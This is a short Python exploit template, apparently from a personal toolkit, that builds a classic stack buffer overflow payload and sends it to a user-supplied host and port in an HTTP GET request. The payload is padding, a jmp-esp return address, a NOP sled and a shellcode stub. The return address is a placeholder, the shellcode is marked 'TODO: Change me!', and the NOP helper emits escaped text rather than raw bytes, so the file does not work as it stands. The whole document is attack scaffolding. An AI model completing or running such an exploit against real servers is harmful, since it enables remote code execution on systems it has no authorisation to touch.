#!/usr/bin/env python
# $Id: template_exploit.py,v 1.0 2018/07/08 00:38:41 dhn Exp $

import struct
import socket
import argparse

# TODO: Change me!
shellcode =  (
	"\x89\xe6\xd9\xe1\xd9\x76\xf4\x59\x49\x49\x49\x49\x49"
	"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37"
	"\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
	"\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
)

def p(x):
	return struct.pack("<L", x)

def nops(size=1024):
	return "\\x90" * size

def run(opt):
	padding = "A" * 666
	jmp_esp = p(0xdeadbeef)

	# PAYLOAD
	payload = padding
	payload += jmp_esp
	payload += nops(1337)
	payload += shellcode

	# REQUEST
	request = "GET /" + payload + " HTTP/1.1\r\n"
	request += "Host: 172.16.133.131\r\n"
	request += "User-Agent: Mozilla/5.0\r\n\r\n"

	print("[+] Sending the payload to %s:%s" % (opt.host, opt.port))
	expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	expl.connect((opt.host, int(opt.port)))
	expl.send(request)
	expl.close()

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("--host", help="Target hostname or ip", required=True)
	parser.add_argument("--port", help="Target port", required=True)
	args = parser.parse_args()

	run(args)
